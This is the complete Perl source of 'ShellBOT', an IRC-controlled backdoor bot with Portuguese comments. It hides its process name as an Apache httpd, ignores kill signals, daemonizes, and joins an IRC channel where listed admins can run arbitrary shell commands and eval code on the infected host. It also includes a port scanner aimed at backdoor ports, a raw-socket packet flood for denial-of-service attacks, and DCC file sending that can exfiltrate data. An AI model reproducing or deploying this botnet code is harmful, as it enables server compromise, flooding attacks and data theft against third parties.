#
#  ShellBOT - Atrix Team
#
#   0ldW0lf - oldwolf@atrix-team.org
#           - www.atrix-team.org
#           - www.atrix.cjb.net
#
# modificado por poerschke 
# irc.gigachat.net #spykids
#
################ CONFIGURACAO #################################################################
my $processo = "/hsphere/shared/apache/bin/httpd -DSSL"; # Nome do processo que vai aparece no ps       #
#----------------------------------------------################################################
my $linas_max="10";                             # Evita o flood :) depois de X linhas         #
#----------------------------------------------################################################
my $sleep="4";                                 # ele dorme X segundos                         #
##################### IRC #####################################################################
@adms=("poerschke","_CaKe_");                       # Nick do administrador                        #
#----------------------------------------------################################################
my @canais=("#perl");                         # Caso haja senha ("#canal :senha")            #
#----------------------------------------------################################################
my $nick="spykids";	                       # Nick do bot. Caso esteja em uso vai aparecer #
                                               # aparecer com numero radonamico no final      #
#----------------------------------------------################################################
my $ircname = "rox";                     # User ID                                      #
#----------------------------------------------################################################
chop (my $realname = `uname -a`);              # Full Name                                    #
#----------------------------------------------################################################
$servidor="irc.gigachat.net" unless $servidor;  # Servidor de irc que vai ser usado            #
                                               # caso não seja especificado no argumento      #
#----------------------------------------------################################################
my $porta="6667";	                       # Porta do servidor de irc                     #
################ ACESSO A SHELL ###############################################################
my $secv = 1;	                               # 1/0 pra habilita/desabilita acesso a shell   #
###############################################################################################

my $VERSAO = "0.2";

$SIG{"INT"} = "IGNORE";
$SIG{"HUP"} = "IGNORE";
$SIG{"TERM"} = "IGNORE";
$SIG{"CHLD"} = "IGNORE";
$SIG{"PS"} = "IGNORE";

use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);



our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();

#############################
#  B0tchZ na veia ehehe :P  #
#############################

$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == "1") {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{"host"} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{"porta"} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{"nick"} = $meunick;
     $irc_servers{$IRC_cur_socket}{"meuip"} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 1;
   }

}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{""}) if (defined($irc_servers{""}));
   &DCC::connections;
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{"nick"};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);

     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp="";
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}


 
sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION ShellBOT-$VERSAO por 0ldW0lf\001");
       }
       if (grep {$_ =~ /^\Q$pn\E$/i } @adms) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
         }
         if ($args =~ /^(\Q$meunick\E|\!atrix)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "!atrix" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         } 
       }
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4; 
         $irc_servers{$IRC_cur_socket}{"nick"} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       nick("$meunick".int rand(9999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{"nick"} = $meunick;
       $irc_servers{$IRC_cur_socket}{"nome"} = "$1";
       foreach my $canal (@canais) {
         sendraw("JOIN $canal");
       }
   }
}

sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if ($funcarg =~ /^portscan (.*)/) {
             my $hostip="$1";
             my @portas=( 44464, 4444, 14589, 666, 6666, 6968, 26092, 530, 46256, 31337,
             2222, 3879, 30464, 40193, 36864, 33270, 36864, 40193, 30464,
             8008, 1234, 6969, 7788, 1524, 10000, 12321, 43690, 3333,
             9999, 8975, 16705, 2313, 21317, 36864, 13330, 58821, 6682, 5678,
             45295, 65535, 26112, 7512, 24876, 9191, 5321, 50766, 1492, 12345,
             12346, 6969, 6970, 12666, 1666, 80, 21, 23, 25, 110, 5252, 9988, 
             41254, 5074, 139, 44123);
             my (@aberta, %porta_banner);
             foreach my $porta (@portas)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => "tcp", Timeout => 4);
                if ($scansock) {
                   push (@aberta, $porta);
                   $scansock->close;
                }
             }

             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :portas abertas: @aberta");
             } else {
                 sendraw($IRC_cur_socket,"PRIVMSG $printl :Nenhuma porta aberta foi encontrada"); 
             }
           }




	     if ($funcarg =~ /^pacota\s+(.*)\s+(\d+)\s+(\d+)/) {
             my ($dtime, %pacotes) = attacker("$1", "$2", "$3");
             $dtime = 1 if $dtime == 0;
             my %bytes;
             $bytes{igmp} = $2 * $pacotes{igmp};
             $bytes{icmp} = $2 * $pacotes{icmp};
             $bytes{o} = $2 * $pacotes{o};
             $bytes{udp} = $2 * $pacotes{udp};
             $bytes{tcp} = $2 * $pacotes{tcp};
            
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002 - Status GERAL -\002");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Tempo\002: $dtime"."s");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Total pacotes\002: ".($pacotes{udp} + $pacotes{igmp} + $pacotes{icmp} +  $pacotes{o}));
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Total bytes\002: ".($bytes{icmp} + $bytes {igmp} + $bytes{udp} + $bytes{o}));
             sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Média de envio\002: ".int((($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)/$dtime)." kbps");


           }
           exit;
       }
  }
}
 
sub ircase {
  my ($kem, $printl, $case) = @_;

  if ($case =~ /^entrar (.*)/) {
     j("$1");
   } 
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   
   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   if ($case =~ /^conecta\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   if ($case =~ /^send\s+(\S+)\s+(\S+)/) {
      DCC::SEND("$1", "$2");
   }
   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   if ($case =~ /^eval (.*)/) {
     eval "$1";
   }
}
sub shell {
  return unless $secv;
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "Diertório inexistente!");
    return;
  } 
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}

#eu fiz um pacotadorzinhu e talz.. dai colokemo ele aki
sub attacker {
  my $iaddr = inet_aton($_[0]);
  my $msg = "B" x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
  
  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65535; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;

       # DoS ?? :P
       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;;
       }
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}



#############
#  ALIASES  #
#############

sub action {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001ACTION $_[1]\001");
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}  

sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub hop {
    return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub dehop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub voice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +v $_[1]");
}
sub devoice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -v $_[1]");
}
sub ban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +b $_[1]");
}
sub unban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -b $_[1]");
}
sub kick {
   return unless $#_ == 1;
   sendraw("KICK $_[0] $_[1] :$_[2]");
}

sub modo {
   return unless $#_ == 0;
   sendraw("MODE $_[0] $_[1]");
}
sub mode { modo(@_); }

sub j { &entrar(@_); }
sub entrar {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {sendraw("PART $_[0]");}

sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}

sub invite {
   return unless $#_ == 1;
   sendraw("INVITE $_[1] $_[0]");
}
sub topico {
   return unless $#_ == 1;
   sendraw("TOPIC $_[0] $_[1]");
}
sub topic { topico(@_); }

sub whois {
  return unless $#_ == 0;
  sendraw("WHOIS $_[0]");
}
sub who {
  return unless $#_ == 0;
  sendraw("WHO $_[0]");
}
sub names {
  return unless $#_ == 0;
  sendraw("NAMES $_[0]");
}
sub away {
  sendraw("AWAY $_[0]");
}
sub back { away(); }
sub quit {
  sendraw("QUIT :$_[0]");
}



# DCC
package DCC;

sub connections {
   my @ready = $dcc_sel->can_read(1);
#   return unless (@ready);
   foreach my $fh (@ready) {
     my $dcctipo = $DCC{$fh}{tipo};
     my $arquivo = $DCC{$fh}{arquivo};
     my $bytes = $DCC{$fh}{bytes};
     my $cur_byte = $DCC{$fh}{curbyte};
     my $nick = $DCC{$fh}{nick};

     my $msg;
     my $nread = sysread($fh, $msg, 10240);

     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {
        $DCC{$fh}{status} = "Cancelado";
        $DCC{$fh}{ftime} = time;
        $dcc_sel->remove($fh);
        $fh->close;
        next;
     }

     if ($dcctipo eq "get") {
        $DCC{$fh}{curbyte} += length($msg);

        my $cur_byte = $DCC{$fh}{curbyte};

        open(FILE, ">> $arquivo");
        print FILE "$msg" if ($cur_byte <= $bytes);
        close(FILE);

        my $packbyte = pack("N", $cur_byte);
        print $fh "$packbyte";

        if ($bytes == $cur_byte) {
           $dcc_sel->remove($fh);
           $fh->close;
           $DCC{$fh}{status} = "Recebido";
           $DCC{$fh}{ftime} = time;
           next;
        }
     } elsif ($dcctipo eq "send") {
          my $send = $fh->accept;
          $send->autoflush(1);
          $dcc_sel->add($send);
          $dcc_sel->remove($fh);
          $DCC{$send}{tipo} = "sendcon";
          $DCC{$send}{itime} = time;
          $DCC{$send}{nick} = $nick;
          $DCC{$send}{bytes} = $bytes;
          $DCC{$send}{curbyte} = 0;
          $DCC{$send}{arquivo} = $arquivo;
          $DCC{$send}{ip} = $send->peerhost;
          $DCC{$send}{porta} = $send->peerport;
          $DCC{$send}{status} = "Enviando";

          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon
          open(FILE, "< $arquivo");
          my $fbytes;
          read(FILE, $fbytes, 1024);
          print $send "$fbytes";
          close FILE;
#          delete($DCC{$fh});
     } elsif ($dcctipo eq "sendcon") {
          my $bytes_sended = unpack("N", $msg);
          $DCC{$fh}{curbyte} = $bytes_sended;
          if ($bytes_sended == $bytes) {
             $fh->close;
             $dcc_sel->remove($fh);
             $DCC{$fh}{status} = "Enviado";
             $DCC{$fh}{ftime} = time;
             next;
          }
          open(SENDFILE, "< $arquivo");
          seek(SENDFILE, $bytes_sended, 0);
          my $send_bytes;
          read(SENDFILE, $send_bytes, 1024);
          print $fh "$send_bytes";
          close(SENDFILE);
     }
   }
}


sub SEND {
  my ($nick, $arquivo) = @_;
  unless (-r "$arquivo") {
    return(0);
  }
 
  my $dccark = $arquivo;
  $dccark =~ s/[.*\/](\S+)/$1/;

  my $meuip = $::irc_servers{"$::IRC_cur_socket"}{"meuip"};
  my $longip = unpack("N",inet_aton($meuip));

  my @filestat = stat($arquivo);
  my $size_total=$filestat[7];
  if ($size_total == 0) {
     return(0);
  }

  my ($porta, $sendsock);
  do {
    $porta = int rand(64511);
    $porta += 1024;
    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => "tcp") and $dcc_sel->add($sendsock);
  } until $sendsock;

  $DCC{$sendsock}{tipo} = "send";
  $DCC{$sendsock}{nick} = $nick;
  $DCC{$sendsock}{bytes} = $size_total;
  $DCC{$sendsock}{arquivo} = $arquivo;


  &::ctcp("$nick", "DCC SEND $dccark $longip $porta $size_total");

}

sub GET {
  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;
  return(0) if (-e "$arquivo");
  if (open(FILE, "> $arquivo")) {
     close FILE;
  } else { 
    return(0); 
  }

  my $dccip=fixaddr($dcclongip);
  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);
  my $dccsock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);
  $dccsock->autoflush(1);
  $dcc_sel->add($dccsock);
  $DCC{$dccsock}{tipo} = "get";
  $DCC{$dccsock}{itime} = time;
  $DCC{$dccsock}{nick} = $nick;
  $DCC{$dccsock}{bytes} = $bytes;
  $DCC{$dccsock}{curbyte} = 0;
  $DCC{$dccsock}{arquivo} = $arquivo;
  $DCC{$dccsock}{ip} = $dccip;
  $DCC{$dccsock}{porta} = $dccporta;
  $DCC{$dccsock}{status} = "Recebendo";
}

# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas
sub Status {
  my $socket = shift;
  my $sock_tipo = $DCC{$socket}{tipo};
  unless (lc($sock_tipo) eq "chat") {
    my $nick = $DCC{$socket}{nick};
    my $arquivo = $DCC{$socket}{arquivo};
    my $itime = $DCC{$socket}{itime};
    my $ftime = time;
    my $status = $DCC{$socket}{status};
    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});

    my $d_time = $ftime-$itime;

    my $cur_byte = $DCC{$socket}{curbyte};
    my $bytes_total =  $DCC{$socket}{bytes};

    my $rate = 0;
    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;
    my $porcen = ($cur_byte*100)/$bytes_total;

    my ($r_duv, $p_duv);
    if ($rate =~ /^(\d+)\.(\d)(\d)(\d)/) {
       $r_duv = $3; $r_duv++ if $4 >= 5;
       $rate = "$1\.$2"."$r_duv";
    }
    if ($porcen =~ /^(\d+)\.(\d)(\d)(\d)/) {
       $p_duv = $3; $p_duv++ if $4 >= 5;
       $porcen = "$1\.$2"."$p_duv";
    }
    return("$sock_tipo","$status","$nick","$arquivo","$bytes_total", "$cur_byte","$d_time", "$rate", "$porcen");
  }


  return(0);
}


# esse "sub fixaddr" daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)
sub fixaddr {
    my ($address) = @_;

    chomp $address;     # just in case, sigh.
    if ($address =~ /^\d+$/) {
        return inet_ntoa(pack "N", $address);
    } elsif ($address =~ /^[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}$/) {
        return $address;
    } elsif ($address =~ tr/a-zA-Z//) {                    # Whee! Obfuscation!
        return inet_ntoa(((gethostbyname($address))[4])[0]);
    } else {
        return;
    }

}
